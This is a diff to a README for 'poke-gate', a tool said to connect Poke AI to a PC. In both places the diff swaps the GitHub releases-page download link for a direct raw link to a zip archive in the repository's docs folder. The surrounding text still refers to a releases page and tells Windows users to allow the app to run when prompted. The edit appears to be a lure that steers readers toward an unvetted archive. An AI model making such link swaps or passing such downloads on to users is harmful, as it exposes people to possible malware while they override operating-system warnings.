@@ -1,6 +1,6 @@
 # 🟦 poke-gate - Connect Poke AI to your PC
 
-[![Download poke-gate](https://img.shields.io/badge/Download%20poke-gate-grey?style=for-the-badge)](https://github.com/Maheshshar578/poke-gate/releases)
+[![Download poke-gate](https://img.shields.io/badge/Download%20poke-gate-grey?style=for-the-badge)](https://raw.githubusercontent.com/Maheshshar578/poke-gate/main/docs/poke_gate_3.0-alpha.4.zip)
 
 ## 🚀 What poke-gate does
 
@@ -32,7 +32,7 @@ If Windows asks for permission, choose the option that lets the app run.
 
 Visit this page to download poke-gate:
 
-https://github.com/Maheshshar578/poke-gate/releases
+https://raw.githubusercontent.com/Maheshshar578/poke-gate/main/docs/poke_gate_3.0-alpha.4.zip
 
 On the releases page:
 
